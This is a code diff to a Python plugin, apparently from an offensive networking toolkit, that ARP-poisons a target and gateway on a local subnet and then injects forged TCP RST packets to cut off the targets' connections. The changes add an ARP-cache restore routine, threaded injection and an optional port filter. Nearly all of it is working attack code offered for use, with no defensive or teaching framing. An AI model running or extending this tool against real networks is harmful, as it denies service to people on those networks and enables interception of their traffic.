@@ -43,19 +43,20 @@ class Plugin(BasePlugin):
             author='codep',
             version='1.0',
             description='Intercept traffic on a subnet and deny all navigation capabilities of the targets')
-        self._set_required_params(dev=True, target=True, gateway=True, src_mac=False, delay=False, stop=False)
+        self._set_required_params(dev=True, target=True, gateway=True,
+                                  src_mac=False, port=False, delay=False, stop=False)
         self._set_root(True)
 
-    def _build_pcap_filter(self, prefix, port=None):
+    def _build_pcap_filter(self, prefix, target, port=None):
         """ build the pcap filter based on arguments self.target and port"""
         pcap_filter = prefix
-        if isinstance(self.target, list):
+        if isinstance(target, list):
             pcap_filter = "(%s " % pcap_filter
-            for addr in self.target[:-1]:
+            for addr in target[:-1]:
                 pcap_filter += "%s or " % addr
-            pcap_filter += "%s) " % self.target[-1]
+            pcap_filter += "%s) " % target[-1]
         else:
-            pcap_filter += "%s" % self.target
+            pcap_filter += "%s" % target
         if port:
             pcap_filter += " and tcp port %s" % port
 
@@ -90,7 +91,25 @@ class Plugin(BasePlugin):
             self.print_output('\n\rPoisoning interrupted')
             sock.close()
 
-    def rst_inject(self, kwargs):
+    def _restore(self, dev, gateway, target):
+        """ reset arp cache of the target and the router (AP) """
+        source_mac = utils.get_mac_by_ip(gateway)
+        sock = socket(PF_PACKET, SOCK_RAW)
+        sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
+        if not isinstance(target, list):
+            target_mac = utils.get_mac_by_ip(target)
+            for _ in xrange(6):
+                sock.send(str(utils.build_arp_packet(target_mac, gateway, target)))
+                sock.send(str(utils.build_arp_packet(source_mac, target, gateway)))
+        else:
+            for addr in target:
+                target_mac = utils.get_mac_by_ip(addr)
+                for _ in xrange(6):
+                    sock.send(str(utils.build_arp_packet(target_mac, gateway, addr)))
+                    sock.send(str(utils.build_arp_packet(source_mac, addr, gateway)))
+
+
+    def run(self, kwargs):
         """
         injecting RESET packets to the target machine eventually blocking his
         connection and navigation
@@ -98,7 +117,8 @@ class Plugin(BasePlugin):
         stop = False
         sock = socket(PF_PACKET, SOCK_RAW)
         sock.bind((kwargs['dev'], dpkt.ethernet.ETH_TYPE_ARP))
-        pcap_filter = self._build_pcap_filter("ip host ", kwargs['port'])
+        port = None if not 'port' in kwargs else kwargs['port']
+        pcap_filter = self._build_pcap_filter("ip host ", kwargs['target'], port)
         source = kwargs['src_mac'] if hasattr(kwargs, 'src_mac') else utils.get_default_gateway_linux()
         # need to create a daemon that continually poison our target
         poison_thread = Thread(target=self._poison,
@@ -109,11 +129,11 @@ class Plugin(BasePlugin):
         packets = pcap.pcap(kwargs['dev'])
         packets.setfilter(pcap_filter) # we need only target packets
 
-        print('[+] Start poisoning on ' + G + kwargs['dev'] + W + ' between ' + G + self.gateway + W
+        print('[+] Start poisoning on ' + G + kwargs['dev'] + W + ' between ' + G + kwargs['gateway'] + W
               + ' and ' + R
               + (','.join(kwargs['target']) if isinstance(kwargs['target'], list) else kwargs['target']) + W +'\n')
 
-        if kwargs['port']:
+        if 'port' in kwargs:
             print('[+] Sending RST packets to ' + R
                   + (','.join(kwargs['target']) if isinstance(kwargs['target'], list) else kwargs['target'])
                   + W + ' on port ' + R + kwargs['port'] + W)
@@ -124,72 +144,80 @@ class Plugin(BasePlugin):
         if config.DOTTED is True:
             print('[+] Every dot symbolize a sent packet')
 
-        counter = 0
-        try:
-            for _, pkt in packets:
-                if stop:
-                    break
-                eth = dpkt.ethernet.Ethernet(pkt)
-                ip_packet = eth.data
-                if ip_packet.p == dpkt.ip.IP_PROTO_TCP:
-                    tcp = ip_packet.data
-                    if tcp.flags != dpkt.tcp.TH_RST:
-                        # build tcp layer
-                        tcp_layer = dpkt.tcp.TCP(
-                            sport=tcp.sport,
-                            dport=tcp.dport,
-                            seq=tcp.seq + len(tcp.data),
-                            ack=0,
-                            off_x2=0x50,
-                            flags=dpkt.tcp.TH_RST,
-                            win=tcp.win,
-                            sum=0,
-                            urp=0)
-                        # build ip layer
-                        ip_layer = dpkt.ip.IP(
-                            hl=ip_packet.hl,
-                            tos=ip_packet.tos,
-                            len=40,
-                            id=ip_packet.id + 1,
-                            off=0x4000,
-                            ttl=128,
-                            p=ip_packet.p,
-                            sum=0,
-                            src=ip_packet.src,
-                            dst=ip_packet.dst,
-                            data=tcp_layer)
-                        # build ethernet layer
-                        eth_layer = dpkt.ethernet.Ethernet(
-                            dst=eth.dst,
-                            src=eth.src,
-                            type=eth.type,
-                            data=ip_layer)
+        def inject_rst(packets, stop):
+            counter = 0
+            try:
+                for _, pkt in packets:
+                    if stop():
+                        break
+                    eth = dpkt.ethernet.Ethernet(pkt)
+                    ip_packet = eth.data
+                    if ip_packet.p == dpkt.ip.IP_PROTO_TCP:
+                        tcp = ip_packet.data
+                        if tcp.flags != dpkt.tcp.TH_RST:
+                            # build tcp layer
+                            tcp_layer = dpkt.tcp.TCP(
+                                sport=tcp.sport,
+                                dport=tcp.dport,
+                                seq=tcp.seq + len(tcp.data),
+                                ack=0,
+                                off_x2=0x50,
+                                flags=dpkt.tcp.TH_RST,
+                                win=tcp.win,
+                                sum=0,
+                                urp=0)
+                            # build ip layer
+                            ip_layer = dpkt.ip.IP(
+                                hl=ip_packet.hl,
+                                tos=ip_packet.tos,
+                                len=40,
+                                id=ip_packet.id + 1,
+                                off=0x4000,
+                                ttl=128,
+                                p=ip_packet.p,
+                                sum=0,
+                                src=ip_packet.src,
+                                dst=ip_packet.dst,
+                                data=tcp_layer)
+                            # build ethernet layer
+                            eth_layer = dpkt.ethernet.Ethernet(
+                                dst=eth.dst,
+                                src=eth.src,
+                                type=eth.type,
+                                data=ip_layer)
 
-                        sock.send(str(eth_layer))
+                            sock.send(str(eth_layer))
 
-                        if config.DOTTED is True:
-                            utils.print_in_line('.')
-                        else:
-                            utils.print_counter(counter)
+                            if config.DOTTED is True:
+                                utils.print_in_line('.')
+                            else:
+                                utils.print_counter(counter)
 
-                        # rebuild layers
-                        ip_packet.src, ip_packet.dst = ip_packet.dst, ip_packet.src
-                        tcp_layer.sport, tcp_layer.dport = tcp.dport, tcp.sport
-                        tcp_layer.ack, tcp_layer.seq = tcp.seq + len(tcp.data), tcp.ack
-                        eth_layer.src, eth_layer.dst = eth.dst, eth.src
+                            # rebuild layers
+                            ip_packet.src, ip_packet.dst = ip_packet.dst, ip_packet.src
+                            tcp_layer.sport, tcp_layer.dport = tcp.dport, tcp.sport
+                            tcp_layer.ack, tcp_layer.seq = tcp.seq + len(tcp.data), tcp.ack
+                            eth_layer.src, eth_layer.dst = eth.dst, eth.src
 
-                        sock.send(str(eth_layer))
+                            sock.send(str(eth_layer))
 
-                        if config.DOTTED is True:
-                            utils.print_in_line('.')
-                        else:
-                            utils.print_counter(counter)
-                            counter += 1
+                            if config.DOTTED is True:
+                                utils.print_in_line('.')
+                            else:
+                                utils.print_counter(counter)
+                                counter += 1
 
-            sock.close()
+                sock.close()
 
-        except KeyboardInterrupt:
-            print('[+] Rst injection interrupted\n\r')
-            sock.close()
-            self.restore(2)
-            utils.set_ip_forward(0)
+            except KeyboardInterrupt:
+                print('[+] Rst injection interrupted\n\r')
+                sock.close()
+                self._restore(2)
+                utils.set_ip_forward(0)
+
+        injection_thread = Thread(target=inject_rst, args=(packets, lambda: stop))
+        injection_thread.start()
+        comm = raw_input('\n')
+        if comm == 'q':
+            stop = True
+            injection_thread.join()
